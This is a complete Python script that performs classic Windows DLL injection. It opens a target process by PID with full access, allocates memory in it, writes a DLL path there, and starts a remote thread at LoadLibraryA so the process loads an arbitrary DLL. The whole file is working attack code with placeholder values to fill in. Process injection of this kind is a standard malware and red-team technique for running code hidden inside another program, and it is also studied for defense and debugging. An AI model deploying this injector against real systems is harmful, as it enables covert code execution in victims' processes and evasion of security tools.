import os
from ctypes import *
from ctypes import wintypes

pid = 1337 # change this line
dll_path = b"C:\\path\\to\\file.dll" # change this line

class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [
        ('nLength', wintypes.DWORD),
        ('lpSecurityDescriptor', wintypes.LPVOID),
        ('bInheritHandle', wintypes.BOOL)
    ]

kernel32 = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (
    wintypes.DWORD,
    wintypes.BOOL,
    wintypes.DWORD
)
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (
    wintypes.HANDLE,
    wintypes.LPVOID,
    SIZE_T,
    wintypes.DWORD,
    wintypes.DWORD
)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (
    wintypes.HANDLE,
    wintypes.LPVOID,
    wintypes.LPCVOID,
    SIZE_T,
    POINTER(SIZE_T)
)
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandleA = kernel32.GetModuleHandleA
GetModuleHandleA.argtypes = (LPCTSTR, )
GetModuleHandleA.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (
    wintypes.HANDLE,
    LPCTSTR
)
GetProcAddress.restype = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (
    wintypes.HANDLE,
    LPSECURITY_ATTRIBUTES,
    SIZE_T,
    LPTHREAD_START_ROUTINE,
    wintypes.LPVOID,
    wintypes.DWORD,
    wintypes.LPDWORD
)
CreateRemoteThread.restype = wintypes.HANDLE

process_handle = OpenProcess(
    PROCESS_ALL_ACCESS,
    False,
    pid
)
if not process_handle:
    raise WinError()
print("[!] ProcessHandle for PID {} -> {}".format(pid, process_handle))

remote_memory = VirtualAllocEx(
    process_handle,
    False,
    len(dll_path) + 1,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
)
if not remote_memory:
    raise WinError()
print("[!] Allocated Memory for PID {}, address -> {}".format(pid, hex(remote_memory)))

write = WriteProcessMemory(
    process_handle,
    remote_memory,
    dll_path,
    len(dll_path) + 1,
    None
)
if not write:
    raise WinError()
print("[!] Bytes Written from {} -> {}".format(os.path.abspath(dll_path.decode('utf-8')), hex(remote_memory)))

load_lib = GetProcAddress(
    GetModuleHandleA(b"kernel32.dll"),
    b"LoadLibraryA"
)
if not load_lib:
    raise WinError()
print("[!] LoadLibraryA address -> {}".format(hex(load_lib)))

rthread = CreateRemoteThread(
    process_handle,
    None,
    0,
    load_lib,
    remote_memory,
    EXECUTE_IMMEDIATELY,
    None
)
if not rthread:
    raise WinError()
print("[!] Started remote thread")
